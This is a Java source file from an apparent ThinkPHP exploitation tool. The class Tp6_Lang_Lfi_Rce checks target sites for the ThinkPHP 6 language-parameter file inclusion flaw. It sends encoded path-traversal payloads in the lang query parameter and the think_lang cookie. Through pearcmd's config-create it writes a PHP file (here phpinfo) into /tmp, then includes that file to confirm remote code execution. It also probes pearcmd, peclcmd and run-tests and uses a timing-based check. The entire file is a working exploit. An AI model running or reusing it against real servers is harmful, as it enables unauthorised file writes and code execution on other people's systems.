package exploit;

import com.example.thinkphpgui.ConfigManager;
import com.example.thinkphpgui.Exploit;
import com.example.thinkphpgui.utils.HttpRequestUtil;
import org.omg.CORBA.TIMEOUT;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.SocketTimeoutException;
import java.net.URL;
import java.util.Arrays;
import java.util.List;
import java.util.concurrent.TimeoutException;
import java.util.stream.Stream;

public class Tp6_Lang_Lfi_Rce implements Exploit {
    ConfigManager configManager = ConfigManager.getInstance();
    private final List<String> pathList = Arrays.asList(
            "index.php",
            "public/index.php",
            "admin/index.php"
    );


    private final static List<String> traversalList = Arrays.asList(
            "%2e%2e%2f",
            "%2e%2e%2f%2e%2e%2f",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2f",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f"
    );

    private final static List<String> execFilePathList = Arrays.asList(
            "%2fusr%2flocal%2flib%2fphp%2fbuild%2frun-tests",
            "%2fusr%2flocal%2flib%2fphp%2fpearcmd",
            "%2fusr%2flocal%2flib%2fphp%2fpeclcmd"
    );


    @Override
    public void startScan(String url) {

        verify(url);

    }

    private void verify(String url) {

        int number = (int) (Math.random() * 900000) + 100000;
        for (String path : pathList) {
            String payload=path+"?lang=%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fusr%2flocal%2flib%2fphp%2fpearcmd&+config-create+/&/<?=phpinfo()?>+/tmp/"+number+".php";
            try {

                HttpURLConnection httpURLConnection=HttpRequestUtil.get(url + payload);
                httpURLConnection.setRequestProperty("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8");
                httpURLConnection.setRequestProperty("Accept-Language", "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2");
                httpURLConnection.setRequestProperty("Accept-Encoding", "gzip, deflate, br");
                httpURLConnection.setRequestProperty("Cookie", "think_lang=zh-cn");
                httpURLConnection.setRequestProperty("Upgrade-Insecure-Requests", "1");
                httpURLConnection.setRequestProperty("Priority", "u=0, i");
                httpURLConnection.getResponseCode();

            } catch (Exception e) {
                e.printStackTrace();
            }
        }

        for (String path : pathList) {
            try {
                HttpURLConnection httpURLConnection = HttpRequestUtil.get(url + path + "?lang=%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2ftmp%2f" + number);
                httpURLConnection.setRequestProperty("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8");
                httpURLConnection.setRequestProperty("Accept-Language", "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2");
                httpURLConnection.setRequestProperty("Accept-Encoding", "gzip, deflate, br");
                httpURLConnection.setRequestProperty("Cookie", "think_lang=zh-cn");
                httpURLConnection.setRequestProperty("Upgrade-Insecure-Requests", "1");
                httpURLConnection.setRequestProperty("Priority", "u=0, i");
                BufferedReader bufferedReader;
                if (httpURLConnection.getResponseCode() >= 400) {
                    bufferedReader = new BufferedReader(new InputStreamReader(httpURLConnection.getErrorStream()));
                } else {
                    bufferedReader = new BufferedReader(new InputStreamReader(httpURLConnection.getInputStream()));
                }
                String line;
                while ((line = bufferedReader.readLine()) != null) {
                    if (Stream.of("PHP Version", "PHP Core", "PHP Variables").anyMatch(line::contains)) {
                        configManager.appendToTextArea("[+] " + url + "   存在Tp lang 文件包含漏洞,可rce");
                        return;
                    }
                }

            } catch (Exception e) {
                e.printStackTrace();
            }
        }


        for (String path : pathList) {
            for (String execFilePath : execFilePathList) {
                try {
                    HttpURLConnection httpURLConnection = HttpRequestUtil.get(url + path + "?lang=%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f" + execFilePath);
                    httpURLConnection.setRequestProperty("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8");
                    httpURLConnection.setRequestProperty("Accept-Language", "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2");
                    httpURLConnection.setRequestProperty("Accept-Encoding", "gzip, deflate, br");
                    httpURLConnection.setRequestProperty("Cookie", "think_lang=zh-cn");
                    httpURLConnection.setRequestProperty("Upgrade-Insecure-Requests", "1");
                    httpURLConnection.setRequestProperty("Priority", "u=0, i");

                    BufferedReader bufferedReader;
                    if (httpURLConnection.getResponseCode() >= 400) {
                        bufferedReader = new BufferedReader(new InputStreamReader(httpURLConnection.getErrorStream()));
                    } else {
                        bufferedReader = new BufferedReader(new InputStreamReader(httpURLConnection.getInputStream()));
                    }
                    String line;
                    while ((line = bufferedReader.readLine()) != null) {
                        if (Stream.of("pearcmd.php", "Warning: array_map()", "Warning: max()", "Warning: ksort()", "Warning: Invalid argument", "TEST_PHP_EXECUTABLE", "PHP executable").anyMatch(line::contains)) {
                            configManager.appendToTextArea("[+] " + url + "   存在Tp6 lang 文件包含漏洞");
                            return;
                        }
                    }
                } catch (Exception e) {
                    e.printStackTrace();
                }
            }
        }


        for (String execFilePath : execFilePathList) {
            try {
                HttpURLConnection httpURLConnection = HttpRequestUtil.get(url);
                httpURLConnection.setRequestProperty("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8");
                httpURLConnection.setRequestProperty("Accept-Language", "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2");
                httpURLConnection.setRequestProperty("Accept-Encoding", "gzip, deflate, br");
                String cookie = "think_lang=%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f" + execFilePath;
                httpURLConnection.setRequestProperty("Cookie", cookie);
                httpURLConnection.setRequestProperty("Upgrade-Insecure-Requests", "1");
                httpURLConnection.setRequestProperty("Priority", "u=0, i");

                BufferedReader bufferedReader;
                if (httpURLConnection.getResponseCode() >= 400) {
                    bufferedReader = new BufferedReader(new InputStreamReader(httpURLConnection.getErrorStream()));
                } else {
                    bufferedReader = new BufferedReader(new InputStreamReader(httpURLConnection.getInputStream()));
                }
                String line;
                while ((line = bufferedReader.readLine()) != null) {
                    if (Stream.of("pearcmd.php", "Warning: array_map()", "Warning: max()", "Warning: ksort()", "Warning: Invalid argument", "TEST_PHP_EXECUTABLE", "PHP executable").anyMatch(line::contains)) {
                        configManager.appendToTextArea("[+] " + url + "   存在Tp6 lang 文件包含漏洞");
                        return;
                    }
                }
            } catch (Exception e) {
                e.printStackTrace();
            }

        }


        for (String path : pathList) {
            for (String traversal : traversalList) {
                try {
                    HttpURLConnection httpURLConnection = HttpRequestUtil.get(url + path + "?lang=" + traversal + "public%2findex"); //绝对路径/var/www/public/index
                    httpURLConnection.setRequestProperty("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8");
                    httpURLConnection.setRequestProperty("Accept-Language", "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2");
                    httpURLConnection.setRequestProperty("Accept-Encoding", "gzip, deflate, br");
                    httpURLConnection.setRequestProperty("Upgrade-Insecure-Requests", "1");
                    httpURLConnection.setRequestProperty("Priority", "u=0, i");

                    long startTime=System.currentTimeMillis();
                    int responseCode = httpURLConnection.getResponseCode();
                    long endTime=System.currentTimeMillis();
                    long delay=endTime-startTime;

                    if (responseCode == 404) {
                        break;
                    }
                    if (responseCode == 500&&delay>1800) {
                        configManager.appendToTextArea("[+] " + url + "  可能存在Tp6 lang 文件包含漏洞");
                        return;
                    }
                } catch (SocketTimeoutException e) {
                    configManager.appendToTextArea("[+] " + url + "  可能存在Tp6 lang 文件包含漏洞");
                    return;
                } catch (Exception e) {
                    e.printStackTrace();
                }
            }
        }


        for (String traversal : traversalList) {
            try {
                HttpURLConnection httpURLConnection = HttpRequestUtil.get(url);
                httpURLConnection.setRequestProperty("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8");
                httpURLConnection.setRequestProperty("Accept-Language", "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2");
                httpURLConnection.setRequestProperty("Accept-Encoding", "gzip, deflate, br");
                String cookie = "think_lang="+traversal+"public%2findex";
                httpURLConnection.setRequestProperty("Cookie", cookie);
                httpURLConnection.setRequestProperty("Upgrade-Insecure-Requests", "1");
                httpURLConnection.setRequestProperty("Priority", "u=0, i");

                long startTime=System.currentTimeMillis();
                int responseCode = httpURLConnection.getResponseCode();
                long endTime=System.currentTimeMillis();
                long delay=endTime-startTime;

                if (responseCode == 500&&delay>1800) {
                    configManager.appendToTextArea("[+] " + url + "  可能存在Tp6 lang 文件包含漏洞");
                    return;
                }
            } catch (SocketTimeoutException e) {
                configManager.appendToTextArea("[+] " + url + "  可能存在Tp6 lang 文件包含漏洞");
                return;
            } catch (Exception e) {
                e.printStackTrace();
            }
        }


        configManager.appendToTextArea("[-] " + url + "   不存在Tp6 lang 文件包含漏洞");
    }


}
